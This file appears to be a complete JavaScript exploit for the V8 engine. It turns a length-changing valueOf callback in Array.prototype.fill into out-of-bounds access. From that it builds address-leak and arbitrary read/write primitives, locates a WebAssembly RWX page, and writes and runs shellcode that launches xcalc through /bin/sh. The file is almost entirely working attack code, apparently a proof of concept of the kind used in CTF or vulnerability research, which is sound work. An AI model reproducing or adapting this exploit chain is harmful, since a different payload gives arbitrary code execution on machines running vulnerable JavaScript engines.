function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }
function print(s){console.log(s)};
class convert
{
    constructor()
    {
        this.buf=new ArrayBuffer(8)
        this.uint8array=new Uint8Array(this.buf);
        this.float64array=new Float64Array(this.buf);
        this.uint32array=new Uint32Array(this.buf);
    }
    f2i(x)//float64 ==> uint64
    {
        this.float64array[0]=x;
        let sum = 0;
        for (let i = 0 ;i< 8 ;i ++)
            sum += this.uint8array[i]*(0x100**i);
        return sum;
    }
    i2f(x)
    {
        let tmp = [];
        tmp[0] = (x % 0x100000000);
        tmp[1] = ((x - tmp[0]) / 0x100000000);
        this.uint32array[0]=tmp[0];
        this.uint32array[1]=tmp[1];
        return this.float64array[0];
    }
}
let conv = new convert();

let arr = [1.1];
let oob = [];
let obj = [];
let buf = [];
arr.length = 0x100;
//%SystemBreak();
arr.fill(1.1,10,{
    valueOf:function(){
        arr.length = 2;
        arr.fill(obj);
        oob = [1.1];
        obj = [{"a":0x41414141,"b":{}}];
        buf = new ArrayBuffer(8);
        return 11;
    }
});
let offset_obj;
for(let i = 0 ;i<0x30 ; i++)
{
    let temp = conv.f2i(oob[i]);
    if(temp == 0x4141414100000000)
    {
        offset_obj = i+1;
        break;
    }
}
function addrof(x)
{
    obj[0]["b"]=x;
    return conv.f2i(oob[offset_obj]);
}
//print(addrof(buf).toString(16));

let offset_buf ;
for(let i = 0 ; i< 0x40 ; i++)
{
    let temp = conv.f2i(oob[i]);
    if(temp == 0x8 && conv.f2i(oob[i+2]) == 0x2)
    {
        offset_buf = i +1;
        //print(conv.f2i(oob[i+1]).toString(16));
        break;
    }
}

function write(addr,value)
{
    oob[offset_buf] = conv.i2f(addr);
    let x = new BigUint64Array(buf);
    x[0] = value;
}

function read(addr)
{
    oob[offset_buf] = conv.i2f(addr);
    let x = new Uint8Array(buf);
    let sum = 0;    
    for (let i = 0 ;i< 8 ;i ++)
            sum += x[i]*(0x100**i);
        return sum;
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
//%DebugPrint(f);
let f_addr = addrof(f) - 1;
console.log("f_addr ==> 0x"+f_addr.toString(16));
let share_info_addr = read(f_addr + 0x18) - 1;
console.log("share_info ==> 0x"+share_info_addr.toString(16));
let wasm = read(share_info_addr + 8) - 1;
console.log("wasm ==> 0x"+wasm.toString(16));
let instance=read(wasm+0x10) -1;
console.log("instance ==> 0x"+instance.toString(16));
let rwx_addr=read(instance+0x80)
console.log("rwx_addr ==> 0x"+rwx_addr.toString(16));

shellcode = [0x303d8d4852d23148n, 0x253d8d4857000000n, 0x153d8d4857000000n, 0x24348d4857000000n, 0x48000000093d8d48n, 0x050f0000003bc0c7n, 0x0068732f6e69622fn, 0x726f70786500632dn, 0x414c505349442074n, 0x783b302e303a3d59n, 0x00636c6163n]
for(let i = 0 ; i< shellcode.length ; i++)
{
    write(rwx_addr+i*8,BigInt(shellcode[i]));
}
f();
//%SystemBreak();
